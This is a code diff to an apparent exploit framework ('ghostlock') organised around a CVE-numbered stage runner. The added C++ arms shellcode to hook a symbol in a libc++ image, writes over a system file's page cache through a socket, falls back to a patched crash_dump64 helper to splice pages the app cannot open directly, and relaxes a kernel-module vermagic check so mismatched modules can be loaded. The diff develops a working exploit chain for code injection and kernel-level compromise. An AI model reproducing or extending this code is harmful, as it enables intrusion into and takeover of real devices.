@@ -242,6 +242,7 @@ namespace ghostlock::backend::cve_2026_43284::stage_runner {
             case StageError::HookReadFailed: return "HookReadFailed";
             case StageError::HookImageTooLarge: return "HookImageTooLarge";
             case StageError::HookPlanFailed: return "HookPlanFailed";
+            case StageError::HookIoUnavailable: return "HookIoUnavailable";
         }
         return "Unknown";
     }
@@ -449,6 +450,48 @@ namespace ghostlock::backend::cve_2026_43284::stage_runner {
         return true;
     }
 
+    StagedHookAssets prepare_staged_hook(RealChainContext &ctx,
+                                         std::string_view hook_target,
+                                         std::string_view hook_symbol,
+                                         steps::HookGuardPolicy guard,
+                                         std::vector<std::uint8_t> &image,
+                                         std::uint8_t *shellcode,
+                                         std::size_t shellcode_cap,
+                                         std::uint8_t *shellcode_orig,
+                                         const steps::HookPatchIo &io) {
+        StagedHookAssets out{};
+        out.status = StagedHookStatus::ImageReadFailed;
+        out.error = StageError::HookReadFailed;
+        StageError image_error = StageError::None;
+        if (!read_hook_image(hook_target, steps::kElfMaxImageBytes, image,
+                             image_error)) {
+            out.status = image_error == StageError::HookImageTooLarge
+                                 ? StagedHookStatus::ImageTooLarge
+                                 : StagedHookStatus::ImageReadFailed;
+            out.error = image_error;
+            return out;
+        }
+        /* A read image with no page-cache write face is not an error path the
+         * chain can fix: leave the context unarmed and report it. */
+        if (shellcode == nullptr || shellcode_orig == nullptr ||
+            shellcode_cap == 0U || !io.available()) {
+            out.status = StagedHookStatus::IoUnavailable;
+            out.error = StageError::HookIoUnavailable;
+            return out;
+        }
+        ctx.libcxx_image = image.data();
+        ctx.libcxx_image_size = image.size();
+        ctx.hook_symbol = hook_symbol;
+        ctx.hook_guard = guard;
+        ctx.hook_shellcode = shellcode;
+        ctx.hook_shellcode_cap = shellcode_cap;
+        ctx.hook_shellcode_orig = shellcode_orig;
+        ctx.hook_io = io;
+        out.status = StagedHookStatus::Armed;
+        out.error = StageError::None;
+        return out;
+    }
+
     bool precheck_staged_module(std::string_view module_path,
                                 const lkm::DeviceKernelFacts &required,
                                 lkm::ModuleFacts &facts,
@@ -481,12 +524,15 @@ namespace ghostlock::backend::cve_2026_43284::stage_runner {
             return true;
         }
         /* Only a pure vermagic mismatch is rewritable; every other precheck
-         * failure (bad ELF, non-empty __versions, signature, ...) stays fatal
-         * exactly as before. */
+         * failure (bad ELF, signature, ...) stays fatal exactly as before. */
         if (error != lkm::LkmImageError::VermagicMismatch || !observed.has_vermagic) {
             return false;
         }
-        if (!allow_rewrite) {
+        /* The rewrite fills the required VERMAGIC_STRING. That reconciles only a
+         * differing option tail; a release-token-only difference is not the
+         * rewrite's job and is refused even when the policy allows it. */
+        if (!allow_rewrite ||
+            observed.vermagic_diff != lkm::VermagicDiffReason::Options) {
             facts = observed;
             outcome = lkm::VermagicOutcome::Required;
             return false;
@@ -697,10 +743,19 @@ namespace ghostlock::backend::cve_2026_43284::stage_runner {
             append_bool(status, chain.rollback_incomplete);
             status += " crash_dump=";
             append_bool(status, chain.crash_dump_patched);
+            /* B5-9h-4 hook application: planned/armed describe the assets the
+             * runner prepared, hook is the chain's applied flag and hook_error
+             * names the first reason the hook was not armed/applied. */
+            status += " hook_planned=";
+            append_bool(status, report.hook_planned);
+            status += " hook_armed=";
+            append_bool(status, report.hook_armed);
             status += " hook=";
             append_bool(status, chain.hook_applied);
             status += " hook_restored=";
             append_bool(status, chain.hook_restored);
+            status += " hook_error=";
+            status += stage_error_name(report.hook_error);
             append_event(out, "run.chain", status);
 
             if (report.stage == Stage::Trigger || report.stage == Stage::Full) {
@@ -761,6 +816,7 @@ namespace ghostlock::backend::cve_2026_43284::stage_runner {
             case StageError::HookReadFailed:
             case StageError::HookImageTooLarge:
             case StageError::HookPlanFailed:
+            case StageError::HookIoUnavailable:
                 return 2;
         }
         return 2;
@@ -996,9 +1052,56 @@ namespace ghostlock::backend::cve_2026_43284::stage_runner {
             return stage_exit_code(report);
         }
 
+        /* B5-9h-4: wire the libc++ hook for every non-plan stage. The image and
+         * the two shellcode buffers are frame-owned and outlive the chain; the
+         * hook target gets its own page-cache write face over the carrier's
+         * session socket. */
+        std::vector<std::uint8_t> hook_image{};
+        std::array<std::uint8_t, steps::kShellcodeMaxBytes> hook_shell{};
+        std::array<std::uint8_t, steps::kShellcodeMaxBytes> hook_shell_orig{};
+        const int hook_fd = ::open(hook_target.c_str(), O_RDONLY | O_CLOEXEC);
+        ctx.hook_path = hook_target.c_str();
+        ctx.hook_page.sa = secrets.value;
+        ctx.hook_page.io = ctx.page.io;
+        ctx.hook_page.file_fd = hook_fd;
+        ctx.hook_page.socket_fd = ctx.page.socket_fd;
+        if (hook_fd < 0 && !allow_dev_target && ctx.bridge.available()) {
+            /* The same helper fallback the vendor carrier uses: the patched
+             * crash_dump64 reads the hook target and splices its page when the
+             * App cannot open the system file directly. */
+            ctx.hook_page.old_page.ctx = &ctx.page;
+            ctx.hook_page.old_page.read16 = &real_chain_hook_old_page_read16;
+            ctx.hook_page.helper_write.ctx = &ctx.page;
+            ctx.hook_page.helper_write.splice16 = &real_chain_hook_helper_splice16;
+        }
+        const steps::HookPatchIo hook_io = make_real_hook_io(ctx.hook_page);
+        const StagedHookAssets hook_assets = prepare_staged_hook(
+                ctx, hook_target, hook_symbol, options.hook_guard, hook_image,
+                hook_shell.data(), hook_shell.size(), hook_shell_orig.data(),
+                hook_io);
+        if (hook_assets.status == StagedHookStatus::ImageReadFailed ||
+            hook_assets.status == StagedHookStatus::ImageTooLarge) {
+            /* The hook target image is required: fail the stage explicitly
+             * instead of running a trigger with no hook. */
+            real_chain_release(&ctx.page);
+            StageReport report{};
+            report.stage = stage;
+            report.dev_target = allow_dev_target;
+            report.error = hook_assets.error;
+            report.hook_planned = true;
+            report.hook_error = hook_assets.error;
+            report.vermagic = vermagic_outcome;
+            emit(format_stage_report(report, module_path, target_path,
+                                     plan.module_bytes));
+            return stage_exit_code(report);
+        }
+
         const steps::ChainOps ops = make_real_chain_ops(ctx);
         steps::ChainWorkspace workspace{};
         StageReport report = run_stage(stage, request, ops, workspace);
+        report.hook_planned = true;
+        report.hook_armed = hook_assets.status == StagedHookStatus::Armed;
+        report.hook_error = hook_assets.error;
         report.vermagic = vermagic_outcome;
         if (!ctx.released) {
             /* A pre-chain rejection left the fds open; close them fail-closed. */
